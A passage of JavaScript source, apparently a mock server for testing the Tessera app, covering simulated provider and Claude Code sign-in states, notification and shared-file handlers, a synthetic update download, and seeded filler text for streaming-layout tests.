    const id = url.searchParams.get('id') ?? '';
    const prov = state.providers.find((x) => x.id === id && x.kind === 'claude_code');
    if (!prov) return sendJson(res, 404, { code: 'not_found', message: `no Claude account ${id}` });
    // Signed in there: "Check again" (claude_code_status with refresh) finds it.
    (state.claudeAccountsReady ??= new Set());
    if ((url.searchParams.get('state') ?? 'ready') === 'ready') state.claudeAccountsReady.add(id);
    else {
      state.claudeAccountsReady.delete(id);
      markClaudeAccount(prov, false);
    }
    return sendJson(res, 200, claudeAccountInfo(prov));
  }
  if (p === '/__mock/claude-code' && req.method === 'POST') { // CLAUDE-CODE: installed / signed in or not
    const want = url.searchParams.get('state') ?? 'ready';
    if (!['ready', 'signed_out', 'api_key', 'missing'].includes(want)) return sendJson(res, 400, { code: 'bad_request', message: 'state: ready | signed_out | api_key | missing' });
    claudeCodeState = want;
    state.providers = state.providers.filter((x) => x.id !== 'claude-code');
    if (want !== 'missing') {
      state.providers.push({
        id: 'claude-code', name: 'Claude (your subscription)', kind: 'claude_code', base_url: '',
        authenticated: want !== 'signed_out', auth: 'oauth', ...(want === 'signed_out' ? {} : { account: 'ann@example.com' }),
        models: [
          mkModel('claude-code', 'opus', 'Opus (latest)', 200_000, 64_000, true, true),
          mkModel('claude-code', 'sonnet', 'Sonnet (latest)', 200_000, 64_000, true, true),
          mkModel('claude-code', 'haiku', 'Haiku (latest)', 200_000, 64_000, true, true),
        ],
      });
    }
    broadcast({ type: 'providers_changed' });
    log(`claude code: ${want}`);
    return sendJson(res, 200, claudeCodeInfo());
  }
  if (p === '/__mock/secret-entry' && req.method === 'POST') {
    const rec = state.sessions.get(url.searchParams.get('session_id') ?? CLAUDE_CHAT_ID);
    if (!rec) return sendJson(res, 404, { message: 'no chat' });
    const name = 'LAB_LOGIN';
    const callId = `toolu_entry_${hex(4)}`;
    addEntry(rec, { ...A(CALL(callId, 'save_secret', { action: 'request', name, title: 'Lab login', kind: 'login' })), model: rec.info.model, usage: { input: 0, output: 0, cache_read: 0, cache_write: 0 }, stop: 'tool_use' });
    addEntry(rec, R(callId, 'save_secret', 'Not saved yet. Enter it securely in Tessera.', { details: { secret_entry: { name, title: 'Lab login', kind: 'login', url: '' } } }));
    return sendJson(res, 200, { session_id: rec.info.id, call_id: callId });
  }
  if (p === '/__mock/claude-native27' && req.method === 'POST') {
    return sendJson(res, 200, claudeNative27Fixture(url.searchParams.get('mode') ?? 'weekly', { createSession, addEntry, emitSession }));
  }
  if (p === '/__mock/helper-display' && req.method === 'POST') {
    return sendJson(res, 200, helperDisplayFixture(url.searchParams.get('mode') ?? 'bridge', { createSession, addEntry, emitSession, broadcast, state }));
  }
  if (p === '/__mock/claude-helper' && req.method === 'POST') { // Claude Code's subagent (its own session) is at work again
    const rec = state.sessions.get(CLAUDE_HELPER_ID);
    if (!rec) return sendJson(res, 404, { code: 'not_found', message: 'no Claude helper' });
    rec.info.status = url.searchParams.get('status') ?? 'running';
    rec.info.updated_at = Date.now();
    emitSession(rec);
    return sendJson(res, 200, { status: rec.info.status });
  }
  if (p === '/__mock/daybreak' && req.method === 'POST') {
    const prov = state.providers.find((x) => x.id === (url.searchParams.get('id') ?? 'openai-codex'));
    if (!prov) return sendJson(res, 404, { code: 'not_found', message: 'no such provider' });
    prov.authenticated = url.searchParams.get('authenticated') !== '0';
    const mode = url.searchParams.get('programs') ?? 'blue';
    for (const model of prov.models) {
      if (mode === 'missing') delete model.cyber_access_programs;
      else model.cyber_access_programs = mode === 'blue' ? ['standard', 'daybreak_blue'] : mode === 'red' ? ['standard', 'daybreak_red'] : mode === 'empty' ? [] : ['standard'];
    }
    broadcast({ type: 'providers_changed' });
    return sendJson(res, 200, prov);
  }
  if (p === '/__mock/provider-offline' && req.method === 'POST') { // a model server of the user's is switched off (or on again)
    const prov = state.providers.find((x) => x.id === (url.searchParams.get('id') ?? 'local'));
    if (!prov) return sendJson(res, 404, { code: 'not_found', message: 'no such provider' });
    const off = !['0', 'false'].includes(url.searchParams.get('offline') ?? '1');
    if (url.searchParams.has('empty')) prov.models = []; // a server that never listed a model
    if (off) prov.offline = true;
    else delete prov.offline;
    broadcast({ type: 'providers_changed' });
    log(`provider ${prov.id} ${off ? 'offline' : 'answering again'}`);
    return sendJson(res, 200, prov);
  }
  if (p === '/__mock/model-window' && req.method === 'POST') { // what a model server of the user's runs a model with
    const prov = state.providers.find((x) => x.id === (url.searchParams.get('id') ?? 'local'));
    const m = prov?.models.find((x) => x.id === url.searchParams.get('model'));
    if (!m) return sendJson(res, 404, { code: 'not_found', message: 'no such model' });
    const tokens = Number(url.searchParams.get('tokens') ?? 0);
    const server = url.searchParams.get('server') ?? 'ollama';
    if (tokens > 0) m.context_window = tokens;
    const warning = tokens > 0 ? contextWarning(server, tokens) : null;
    if (warning) m.context_warning = warning;
    else delete m.context_warning;
    broadcast({ type: 'providers_changed' });
    log(`model ${prov.id}/${m.id} window ${tokens}`);
    return sendJson(res, 200, m);
  }
  if (p === '/__mock/mosaics/reset' && req.method === 'POST') {
    log('mosaics reset');
    return sendJson(res, 200, setMosaics(EMPTY_MOSAICS()));
  }
  if (p === '/__mock/board' && req.method === 'POST') { // the agent shows a board (and maybe asks on it), no turn needed
    let body = {};
    try { body = JSON.parse((await readBody(req)) || '{}'); } catch { return sendJson(res, 400, { code: 'bad_request', message: 'Body must be JSON' }); }
    const sid = body.session_id ?? [...state.sessions.values()].map((r) => r.info)
      .filter((i) => !i.private && !i.archived && i.kind === 'chat').sort((a, b) => b.updated_at - a.updated_at)[0]?.id;
    try {
      // As an agent's explicit show (`open: true`): its tile goes beside the chat (`place: "none"`: a card only).
      const sample = sampleBoard(body.kind ?? 'topology');
      const board = showBoard(sid, { id: body.id, title: body.title ?? sample.title, content: body.content ?? sample.content }, body.place);
      const ask = body.ask === false ? null : body.ask ?? sample.ask;
      if (ask) askBoard(sid, { id: board.id, prompt: ask.prompt, input: ask.input }, null).then((a) => log(`board ${board.id} answered: ${a.type}`), () => {});
      log(`board ${board.id} (${board.content.type}) shown in ${sid}${ask ? ' with an ask' : ''}`);
      return sendJson(res, 200, state.boards.get(board.id));
    } catch (err) {
      return sendJson(res, 400, { code: err.code ?? 'bad_request', message: err.message });
    }
  }
  if (p === '/__mock/steps-chat' && req.method === 'POST') return sendJson(res, 200, seedStepsChat()); // long runs of browser steps
  if (p === '/__mock/voice-save-delay' && req.method === 'POST') {
    state.voiceSaveDelay = Math.max(0, Math.min(5000, Number(url.searchParams.get('ms')) || 0));
    return sendJson(res, 200, { delay: state.voiceSaveDelay });
  }
  if (p === '/__mock/sends' && req.method === 'GET') return sendJson(res, 200, state.sends);
  if (p === '/__mock/boards' && req.method === 'GET') return sendJson(res, 200, { boards: [...state.boards.values()], answers: state.answers, signatures: state.signatures });
  if (p === '/__mock/snapshots' && req.method === 'GET') return sendJson(res, 200, state.snapshots);
  if (p === '/__mock/browser' && req.method === 'GET') {
    return sendJson(res, 200, {
      tabs: [...BROWSER.tabs.values()].map((t)=>({...tabInfo(t),size:t.size})),
      attached: Object.fromEntries([...BROWSER.attached].map(([id, m]) => [id, [...m.keys()].filter((c) => clients.has(c)).length])),
      log: BROWSER.log, frames: BROWSER.frames, acks: BROWSER.acks,
    });
  }
  if (p === '/__mock/browser/focus' && req.method === 'POST') { // the page focuses its field by itself (no tap)
    const t = BROWSER.tabs.get(url.searchParams.get('board') ?? '');
    if (!t) return sendJson(res, 404, { code: 'not_found', message: 'no such tab' });
    t.focus = true;
    sendFocus(t);
    return sendJson(res, 200, { ok: true });
  }
  if (p === '/__mock/browser/reset' && req.method === 'POST') {
    BROWSER.log.length = 0; BROWSER.frames = 0; BROWSER.acks = 0;
    return sendJson(res, 200, { ok: true });
  }
  if (isApi) return sendJson(res, 404, { code: 'not_found', message: `No route for ${req.method} ${p}` });
  const bp = /^\/board\/([A-Za-z0-9_-]+)\/([A-Za-z0-9]+)\/?$/.exec(p);
  if (bp && (req.method === 'GET' || req.method === 'HEAD')) { // board_link pages: no network, framed sandboxed by the UI
    const b = state.boards.get(bp[1]);
    const grant = state.boardTokens.get(bp[1]);
    if (!b || b.content.type !== 'html' || !grant || grant.token !== bp[2] || grant.version !== b.version || grant.expires <= Date.now()) return sendJson(res, 404, { code: 'not_found', message: 'no such whiteboard' });
    const body = boardDocument(b.content.html.replaceAll('__BOARD__', b.id).replaceAll('__ASK__', b.ask?.id ?? ''), url.searchParams.get('theme') !== 'light');
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Content-Security-Policy': BOARD_CSP_HEADER, 'X-Frame-Options': 'SAMEORIGIN', 'Cache-Control': 'no-store' });
    return res.end(req.method === 'HEAD' ? undefined : body);
  }
  const pp = /^\/preview\/([0-9a-f]+)\/?$/.exec(p);
  if (pp && (req.method === 'GET' || req.method === 'HEAD')) { // preview_page: a note's HTML, no network, framed sandboxed by the UI
    const html = previewPages.get(pp[1]);
    if (html == null) return sendJson(res, 404, { code: 'not_found', message: 'this preview has expired' });
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Content-Security-Policy': BOARD_CSP_HEADER, 'X-Frame-Options': 'SAMEORIGIN', 'Cache-Control': 'no-store' });
    return res.end(req.method === 'HEAD' ? undefined : boardDocument(html, url.searchParams.get('theme') !== 'light'));
  }
  if (p.startsWith('/board-lib/') && (req.method === 'GET' || req.method === 'HEAD')) { // module imports from an opaque origin need CORS
    const rel = p.slice('/board-lib/'.length);
    if (!BOARD_LIBS.has(rel)) return sendJson(res, 404, { code: 'not_found', message: 'not found' });
    let data;
    try { data = fs.readFileSync(path.join(BOARD_LIB_DIR, rel)); } catch { return sendJson(res, 404, { code: 'not_found', message: `missing ${rel} (assets/board-lib)` }); }
    res.writeHead(200, { 'Content-Type': 'text/javascript; charset=utf-8', 'Access-Control-Allow-Origin': '*', 'Cache-Control': 'public, max-age=86400', 'Content-Length': data.length });
    return res.end(req.method === 'HEAD' ? undefined : data);
  }
  if (req.method !== 'GET' && req.method !== 'HEAD') {
    res.writeHead(405, { Allow: 'GET, HEAD' });
    return res.end();
  }
  return serveStatic(req, res, p);
}

// ─── Scheduled runs: how each ended, and the end of a schedule (engine/inbox.rs) ───
function scheduleOver(job, t = now()) {
  if (job.max_runs && (job.runs ?? 0) >= job.max_runs) return job.max_runs === 1 ? 'it ran once, as set' : `it ran ${job.max_runs} times, as set`;
  if (job.until && t >= job.until) return 'its end date came';
  return null;
}
function endSchedule(job, why) {
  job.enabled = false;
  delete job.next_run;
  job.ended = why;
  broadcast({ type: 'job_updated', job });
  addNotification({ title: 'Scheduled task ended', body: `${job.name}: ${why}.`, from: 'Scheduled tasks', kind: 'job', quiet: true });
  return `Ended the schedule of “${job.name}”: no more runs.`;
}
const JOB_OUTCOME = {
  ok: ['Scheduled task finished', false],
  error: ['Scheduled task failed', true],
  paused: ['Scheduled task paused', true],
  interrupted: ['Scheduled task interrupted', true],
  stopped: ['Scheduled task stopped', false],
};
function jobWorking(job) {
  const rec = job.last_session && state.sessions.get(job.last_session);
  return !!rec && (!!rec.turn || rec.batches.some((b) => !b.summarized && b.agents.some((a) => !a.done))
    || [...state.sessions.values()].some((r) => r.turn && r.info.working_for?.session_id === rec.info.id));
}
function jobRunEnded(job, run, outcome) {
  if (outcome === 'ok' && jobWorking(job)) return; // the helpers' reports still have to arrive
  run.outcome = outcome;
  run.ended_at = now();
  if (state.jobs.includes(job) && job.last_session === run.session_id) {
    job.last_status = outcome;
    job.last_end = run.ended_at;
    broadcast({ type: 'job_updated', job });
  }
  const [title, alert] = JOB_OUTCOME[outcome];
  if (!alert) return; // routine success/stops stay in the run log
  const bot = job.bot_id ? botById(job.bot_id) : null;
  // One item per run: a continued run updates it (unread again).
  addNotification({ title, body: job.name, session_id: run.session_id, from: bot?.name ?? 'Scheduled tasks', kind: 'job', quiet: !alert, replace: 'same' });
}

// ─── NOTIFY-FILES: agents' messages (`notify`) and downloadable files ───────
// Notifications go only to devices that take them (`notify` per device);
// each device sees one once (`ack`), and seeing a chat marks its messages
// seen everywhere. Files are held in memory: `mock_share` adds one (an
// agent's `share_file` call in a chat, or a web view download).
function notifyState() {
  state.notify ??= { list: [], nextId: 1, shown: new Map(), off: new Set() };
  state.sharedFiles ??= new Map();
  return state.notify;
}
function broadcastNotification(n) {
  const ns = notifyState();
  const data = Buffer.from(JSON.stringify({ event: { type: 'notification', notification: notificationPayload(n) } }));
  for (const c of clients) if ((!n.kind || c.automaticNotifications) && !ns.off.has(c.deviceId) && seesSession(n.session_id, c.deviceId)) c.sendRaw(data);
}
// The notification center (store/notify.rs): `kind` says what it's about, a `quiet` one is never a
// system notification, `replace` keeps one per chat ("unread": until read; "same": one per run).
// An empty `notifications_seen` tells devices their notification center changed.
const inboxChanged = () => broadcast({ type: 'notifications_seen', ids: [] });
function addNotification({ title, body = '', session_id = null, from = 'Tessera', urgent = false, delay = 0, kind = '', quiet = false, replace = null, source_key = '', private: privateHint = false }) {
  const ns = notifyState();
  const t = now();
  const fields = { title: String(title || from).slice(0, 80), body: String(body).slice(0, 600), from, urgent: !!urgent, ...(kind ? { kind } : {}), ...(source_key ? { source_key } : {}), ...(quiet ? { quiet: true } : {}), ...((privateHint || state.sessions.get(session_id)?.info.private) ? { private: true } : {}) };
  const earlier = replace && session_id
    ? [...ns.list].reverse().find((x) => x.sent && x.session_id === session_id && (x.kind ?? '') === kind && (replace === 'same' || !x.seen))
    : null;
  if (earlier) {
    const same = ['title', 'body', 'from', 'urgent'].every((k) => earlier[k] === fields[k]) && !!earlier.quiet === quiet && !!earlier.private === !!fields.private;
    if (same) return notificationPayload(earlier);
    const previous = earlier.id;
    ns.list = ns.list.filter((n) => n.id !== previous);
    for (const shown of ns.shown.values()) shown.delete(previous);
    broadcast({ type: 'notifications_seen', ids: [previous] });
  }
  const n = { id: ns.nextId++, ...fields, session_id, created_at: t, due_at: t + (quiet ? 0 : delay * 1000), sent: quiet || delay <= 0, seen: false };
  ns.list.push(n);
  pruneNotifications();
  if (!quiet) broadcastNotification(n);
  inboxChanged();
  if (!n.sent)
    later(delay * 1000, () => {
      if (!ns.list.includes(n)) return;
      n.sent = true;
      broadcastNotification(n);
      inboxChanged();
    });
  return notificationPayload(n);
}
function notificationPayload(n) {
  return n.private || state.sessions.get(n.session_id)?.info.private
    ? { ...n, private: true, title: 'Tessera', body: '', from: '' }
    : n;
}
function pruneNotifications() {
  const ns = notifyState();
  const keep = new Set(ns.list.filter((n) => n.sent && n.due_at >= now() - 30 * DAY).sort((a, b) => b.due_at - a.due_at || b.id - a.id).slice(0, 500));
  ns.list = ns.list.filter((n) => !n.sent || keep.has(n));
}
function forgetNotifications(sid) {
  if (!state.notify) return;
  const before = state.notify.list.length;
  state.notify.list = state.notify.list.filter((n) => n.session_id !== sid);
  if (state.notify.list.length !== before) inboxChanged();
}
/** A device may see it: about no chat, or a chat that is there and not another device's private one. */
function notificationVisible(n, conn) {
  return !n.session_id || (state.sessions.has(n.session_id) && seesSession(n.session_id, conn?.deviceId));
}
function checkNotificationIds(ids, conn) {
  if (ids.length > 600) throw badRequest('too many notifications at once');
  for (const id of ids) {
    const n = notifyState().list.find((x) => x.id === id);
    if (n && !notificationVisible(n, conn)) throw notFound('no such notification');
  }
}
// Who a notification is from, like the server: the bot, else the chat (a private chat's title never).
function senderOf(rec) {
  if (rec?.info.private) return 'Private chat';
  const bot = rec?.info.bot_id ? botById(rec.info.bot_id) : null;
  if (bot) return bot.name;
  return rec?.info.title || 'Tessera';
}
// `text` (tests): the file's contents, typed like the server types a text file.
const TEXT_MIME = [[/\.(txt|log)$/i, 'text/plain'], [/\.(md|markdown)$/i, 'text/markdown'], [/\.json$/i, 'application/json'], [/\.csv$/i, 'text/csv'], [/\.(py|rs|ts|js|sh)$/i, 'text/plain']];
function shareFile({ session_id = null, board_id = null, name, size = 2048, source = 'agent', mime, text }) {
  notifyState();
  let bytes;
  if (typeof text === 'string') {
    bytes = Buffer.from(text, 'utf8');
    size = bytes.length;
  } else {
    bytes = Buffer.alloc(size, 0);
    for (let i = 0; i < size; i++) bytes[i] = 32 + ((i * 7) % 90);
  }
  const textMime = typeof text === 'string' ? TEXT_MIME.find(([re]) => re.test(name))?.[1] : undefined;
  const file = { id: `f${hex(8)}`, name, mime: mime ?? textMime ?? (/\.pdf$/i.test(name) ? 'application/pdf' : /\.csv$/i.test(name) ? 'text/csv' : 'application/octet-stream'), size, created_at: now(), session_id, board_id, source, path: `/home/demo/.local/share/tessera/shared/${name}` };
  state.sharedFiles.set(file.id, { file, bytes });
  broadcast({ type: 'file_shared', file });
  return file;
}
Object.assign(handlers, {
  negotiate_notifications(_p, conn) {
    if (notifyState().legacy) throw badRequest('invalid request: unknown variant `negotiate_notifications`');
    conn.automaticNotifications = true;
    return true;
  },
  notification_presence(p, conn) {
    if (notifyState().legacy) throw badRequest('invalid request: unknown variant `notification_presence`');
    for (const session_id of p.active ? p.session_ids ?? [] : []) handlers.seen_notifications({ session_id }, conn);
    return null;
  },
  pending_notifications_v2(p, conn) {
    if (notifyState().legacy) throw badRequest('invalid request: unknown variant `pending_notifications_v2`');
    return handlers.pending_notifications(p, conn, true);
  },
  list_devices(_p, conn) {
    const ns = notifyState();
    machinesState(); // machines are paired devices too
    return state.devices.map((d) => ({ ...d, current: d.id === conn.deviceId, notify: !ns.off.has(d.id), online: deviceOnline(d.id) }));
  },
  set_device_notify(p, conn) {
    const id = need(p, 'id');
    if (!state.devices.some((d) => d.id === id)) throw notFound('no such device');
    const ns = notifyState();
    if (p.notify) ns.off.delete(id);
    else ns.off.add(id);
    return handlers.list_devices({}, conn);
  },
  list_notifications(_p, conn) {
    pruneNotifications();
    const ns = notifyState();
    const visible = ns.list.filter((n) => notificationVisible(n, conn));
    const sched = visible.filter((n) => !n.sent).sort((a, b) => a.due_at - b.due_at);
    return [...sched, ...visible.filter((n) => n.sent).sort((a, b) => b.due_at - a.due_at || b.id - a.id).slice(0, 50)].map(notificationPayload);
  },
  list_notification_inbox(_p, conn) {
    if (notifyState().legacy) throw badRequest('invalid request: unknown variant `list_notification_inbox`');
    pruneNotifications();
    const visible = notifyState().list.filter((n) => notificationVisible(n, conn));
    return [...visible.filter((n) => !n.sent).sort((a, b) => a.due_at - b.due_at), ...visible.filter((n) => n.sent).sort((a, b) => b.due_at - a.due_at || b.id - a.id).slice(0, 500)].map(notificationPayload);
  },
  clear_notifications(p, conn) {
    if (notifyState().legacy) throw badRequest('invalid request: unknown variant `clear_notifications`');
    const ids = p.ids ?? [];
    checkNotificationIds(ids, conn);
    const ns = notifyState();
    const gone = ns.list.filter((n) => n.sent && ids.includes(n.id)).map((n) => n.id);
    ns.list = ns.list.filter((n) => !gone.includes(n.id));
    if (gone.length) broadcast({ type: 'notifications_seen', ids: gone });
    return null;
  },
  // `mock_inbox { legacy?, missing?, add? }` (tests): an older server without the notification center,
  // a chat gone after the list was sent, or an item the server made itself (`add`: kind, quiet, session_id…).
  mock_inbox(p) {
    if (p.legacy !== undefined) notifyState().legacy = !!p.legacy;
    if (p.missing) state.sessions.delete(p.missing);
    if (p.add) return addNotification({ from: 'Tessera', ...p.add });
    return null;
  },
  send_notification(p) {
    const rec = p.session_id ? getRec(p) : null;
    return addNotification({ title: p.title, body: p.body, session_id: p.session_id ?? null, from: senderOf(rec), delay: p.delay_secs ?? 0 });
  },
  pending_notifications(_p, conn, automatic = false) {
    const ns = notifyState();
    const shown = ns.shown.get(conn.deviceId) ?? new Set();
    const on = !ns.off.has(conn.deviceId);
    const due = ns.list.filter((n) => !n.sent && notificationVisible(n, conn)).map((n) => n.due_at);
    return {
      new: on ? ns.list.filter((n) => (!n.kind || automatic) && n.sent && !n.quiet && !n.seen && !shown.has(n.id) && notificationVisible(n, conn)).map(notificationPayload) : [],
      seen: ns.list.filter((n) => n.seen && shown.has(n.id)).map((n) => n.id),
      next_due: on && due.length ? Math.min(...due) : undefined,
      waiting: [],
    };
  },
  ack_notifications(p, conn) {
    checkNotificationIds(p.ids ?? [], conn);
    const ns = notifyState();
    const shown = ns.shown.get(conn.deviceId) ?? new Set();
    for (const id of p.ids ?? []) shown.add(id);
    ns.shown.set(conn.deviceId, shown);
    return null;
  },
  seen_notifications(p, conn) {
    checkNotificationIds(p.ids ?? [], conn);
    const ns = notifyState();
    const ids = ns.list.filter((n) => n.sent && !n.seen && ((p.ids ?? []).includes(n.id) || (p.session_id && n.session_id === p.session_id)));
    // A quiet item about a chat's activity read within a minute was never news: it goes.
    const notNews = (n) => n.quiet && ['approval', 'helper', 'finished', 'error'].includes(n.kind) && now() < n.due_at + 60_000;
    for (const n of ids) n.seen = true;
    ns.list = ns.list.filter((n) => !ids.includes(n) || !notNews(n));
    if (ids.length) broadcast({ type: 'notifications_seen', ids: ids.map((n) => n.id) });
    return null;
  },
  cancel_notification(p, conn) {
    checkNotificationIds([p.id], conn);
    const ns = notifyState();
    const i = ns.list.findIndex((n) => n.id === p.id);
    if (i < 0) throw notFound('no such notification');
    ns.list.splice(i, 1);
    broadcast({ type: 'notifications_seen', ids: [p.id] });
    return null;
  },
  list_shared_files(p) {
    notifyState();
    const all = [...state.sharedFiles.values()].map((x) => x.file);
    if (p.session_id) return all.filter((f) => f.session_id === p.session_id).reverse();
    if (p.board_id) return all.filter((f) => f.board_id === p.board_id).reverse();
    throw badRequest('give a session_id or a board_id');
  },
  read_shared_file(p) {
    notifyState();
    const x = state.sharedFiles.get(need(p, 'id'));
    if (!x) throw notFound('this file is no longer on the server');
    const off = Math.max(0, p.offset ?? 0);
    const len = Math.min(1 << 20, Math.max(1, p.len ?? 1 << 20));
    const part = x.bytes.subarray(off, off + len);
    return { data: part.toString('base64'), offset: off, size: x.bytes.length, eof: off + part.length >= x.bytes.length };
  },
  mock_app_update(p) {
    state.appUpdateMode = p.mode ?? 'normal';
    if (p.present === false) { state.appUpdate = null; return null; }
    const bytes = Buffer.alloc((2 << 20) + 73, 7);
    bytes.write('MZ', 0); bytes.writeUInt32LE(128, 60); bytes.write('PE\0\0', 128);
    bytes.writeUInt16LE(0x14c, 132); bytes.writeUInt16LE(224, 148);
    bytes.writeUInt16LE(2, 150); bytes.writeUInt16LE(0x10b, 152);
    Buffer.from('\xef\xbe\xad\xdeNullsoftInst', 'latin1').copy(bytes, 1024);
    bytes.write(String(p.tag ?? 'test'), 2048);
    const hash = crypto.createHash('sha256').update(bytes).digest('hex');
    const build = { id: 'upd' + hash.slice(0,24), platform: 'windows-x86_64-desktop',
      version: p.version ?? '0.2.0', size: bytes.length, sha256: hash, added_at: Date.now(), notes: p.notes ?? 'A synthetic Windows setup; not executable.' };
    state.appUpdate = { bytes, build };
    return build;
  },
  get_app_update(p) {
    const x = state.appUpdate;
    if (!x || x.build.platform !== p.platform || x.build.sha256 === p.sha256) return null;
    const parts = (v) => String(v).split(/[.+-]/).slice(0,3).map(Number);
    const a = parts(x.build.version), b = parts(p.version);
    const diff = a.map((v,i) => v - (b[i] ?? 0)).find((v) => v !== 0) ?? 0;
    if (diff < 0 || (diff === 0 && !(x.build.added_at > (p.installed_at ?? Infinity)))) return null;
    return x.build;
  },
  read_app_update(p) {
    const x = state.appUpdate;
    if (!x || x.build.id !== p.id) throw notFound('this update is no longer offered');
    const off = Math.max(0, p.offset ?? 0), len = Math.min(1 << 20, Math.max(1, p.len ?? 1 << 20));
    if (off > x.bytes.length) throw badRequest('offset past the end of the file');
    let part = x.bytes.subarray(off, off + len);
    if (state.appUpdateMode === 'corrupt') part = Buffer.from(part.map((b) => b ^ 1));
    if (state.appUpdateMode === 'truncated') part = part.subarray(0, Math.max(0, part.length - 1));
    return { data: part.toString('base64'), offset: off, size: x.bytes.length,
      eof: state.appUpdateMode === 'truncated' || off + part.length >= x.bytes.length };
  },
  // `mock_notify { session_id?, title, body, delay?, urgent? }` (tests): a message from a chat's agent.
  mock_notify(p) {
    const rec = p.session_id ? getRec(p) : null;
    return addNotification({ title: p.title, body: p.body, session_id: rec?.info.id ?? null, from: senderOf(rec), urgent: p.urgent, delay: p.delay ?? 0 });
  },
  // `mock_share { session_id?, board_id?, name, size?, source?, text? }` (tests): an agent shares a file in a
  // chat (a `share_file` call and its result), or a web view downloads one (`source: "web_view"`).
  mock_share(p) {
    const name = String(need(p, 'name'));
    if (p.source === 'web_view') return shareFile({ ...p, name });
    const rec = getRec(p);
    const file = shareFile({ session_id: rec.info.id, name, size: p.size ?? 2048, source: p.source ?? 'agent', text: p.text });
    if (file.source === 'upload') {
      // A text file's text goes in the message (as the server's attach() does), else a note on it.
      const body = typeof p.text === 'string' ? `\`\`\`\n${p.text}\n\`\`\`` : '(Binary file: use tools that understand it, e.g. `pdftotext` for PDFs.)';
      addEntry(rec, { kind: 'user', content: [{ type: 'text', text: 'Here is the file' }, { type: 'text', text: `[Attached file: ${name} · ${Math.ceil(file.size / 1024)} KB · saved at ${file.path}]\n${body}` }] });
    }
    if (file.source === 'agent') {
      const call = { type: 'tool_call', id: `call_s${hex(4)}`, name: 'share_file', arguments: { path: `out/${name}` } };
      addEntry(rec, { kind: 'assistant', content: [{ type: 'text', text: `Here is ${name}.` }, call], model: rec.info.model, usage: zeroUsage(), stop: 'tool_use' });
      addEntry(rec, { kind: 'tool_result', call_id: call.id, tool: 'share_file', content: [{ type: 'text', text: `Shared ${name} in the chat; the user can download it from there.` }], is_error: false, details: { file } });
    }
    return file;
  },
});

// ─── STREAM mock handlers (contract 8: long replies stream without lag) ───
// `mock_stream { session_id, size?, text?, chunk?, delay?, thinking?, tool_lines?, seed?, prompt? }` (tests): the
// user asks for a long write-up and the agent streams `size` characters (default 50 000) of real-looking
// markdown — prose, a very long paragraph, lists, tables, code fences, a long unbroken line — as many
// small deltas (`chunk` [min, max] characters every `delay` [min, max] ms; default [2, 12] and [3, 8]).
// `thinking` streams that many characters of reasoning first; `tool_lines` runs a bash call whose output
// streams that many lines before the answer. The text is the same for the same `seed`. Returns
// { ok, text, thinking } at once (the expected sources); the turn plays out after.
// `text` supplies bounded custom markdown for layout fixtures (e.g. an image arriving late).
function streamRng(seed) {
  let a = seed >>> 0 || 1;
  return () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = a;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}
const STREAM_SENTENCES = [
  'The node service keeps a single connection to the server and reconnects with a jittered backoff when the link drops.',
  'Every write goes to the journal first, so a crash in the middle of a sync never leaves a half-applied change behind.',
  'On the Raspberry Pi the bottleneck is the SD card, not the CPU, which is why the cache lives in memory and is flushed every few seconds.',
  'If a backup job overlaps with the nightly scrub, the scrub yields and resumes afterwards instead of fighting for the disk.',
  'The firewall only opens the one port the server listens on; everything else stays on the management VLAN.',
  'Certificates rotate automatically thirty days before they expire, and the old one keeps working until every client has the new one.',
  'A machine that misses three heartbeats in a row is marked unreachable, but its queued work is kept rather than dropped.',
  'Logs are rotated by size rather than by date, because a noisy service can fill a small disk long before midnight.',
  'The dashboard reads from a replica, so a slow query there never blocks the agent that is writing.',
  'When two devices edit the same note, the later edit wins per paragraph and the earlier one is kept as a revision.',
  'Most of the time is spent waiting on the network, so the client pipelines requests instead of sending them one by one.',
  'Thumbnails are generated lazily the first time someone scrolls past an image, and cached next to the original.',
  'A scheduled job runs as the bot that owns it, with exactly the credentials that bot was given and nothing more.',
  'The update script checks the signature of the new binary before it replaces the old one, and keeps the old one for a quick rollback.',
  'Memory use stays flat over a week of uptime; the only growth is the search index, which is compacted on Sundays.',
  'For a home lab this is plenty: two cores and four gigabytes handle a dozen chats and a handful of scheduled duties.',
];
const STREAM_TERMS = ['`tessera-node`', '`journal.db`', '**backoff**', '`--bind 0.0.0.0`', '*the replica*', '`zpool scrub`', '**heartbeat**', '`systemctl restart`', '`/var/lib/tessera`', '[the docs](https://example.com/docs)', '`rsync -a --delete`', '**least privilege**'];
const STREAM_LANGS = ['rust', 'ts', 'bash', 'yaml', 'json', 'python'];
function streamCodeLine(lang, i, r) {
  const n = Math.floor(r() * 900) + 100;
  switch (lang) {
    case 'rust': return i % 7 === 0 ? `    // step ${i}: keep the journal in order` : `    let v${i} = journal.append(Entry::new(${n}, "item-${i}"))?;`;
    case 'ts': return i % 6 === 0 ? `  // ${i}: retry with backoff` : `  const r${i} = await client.request("node.sync", { since: ${n}, limit: ${i * 10} });`;
    case 'bash': return i % 5 === 0 ? `# ${i}: check the disk first` : `rsync -a --delete /srv/data/part-${i}/ backup@nas:/pool/part-${i}/ && echo "part ${i}: ${n} files"`;
    case 'yaml': return i % 4 === 0 ? `# job ${i}` : `  - name: job-${i}\n    schedule: "*/${(i % 50) + 5} * * * *"\n    timeout: ${n}s`;
    case 'json': return `  { "id": ${i}, "host": "node-${i % 9}.lan", "port": ${7000 + (n % 999)}, "ok": ${i % 3 !== 0} },`;
    default: return i % 6 === 0 ? `    # ${i}: drop stale rows` : `    rows_${i} = db.execute("SELECT * FROM jobs WHERE id > ?", (${n},)).fetchall()`;
  }
}
function streamCode(lang, lines, r) {
  const head = { rust: 'fn replay(journal: &mut Journal) -> Result<()> {', ts: 'export async function sync(client: Client) {', python: 'def compact(db):', bash: '#!/bin/sh\nset -eu', yaml: 'jobs:', json: '[' }[lang];
  const tail = { rust: '    Ok(())\n}', ts: '}', python: '    return True', bash: 'echo done', yaml: '', json: '  { "id": 0 }\n]' }[lang];
  const body = Array.from({ length: lines }, (_, i) => streamCodeLine(lang, i + 1, r));
  return ['```' + lang, head, ...body, tail, '```'].filter((l) => l !== '').join('\n');
}
function streamMarkdown(size, seed) {
  const r = streamRng(seed);
  const pick = (a) => a[Math.floor(r() * a.length)];
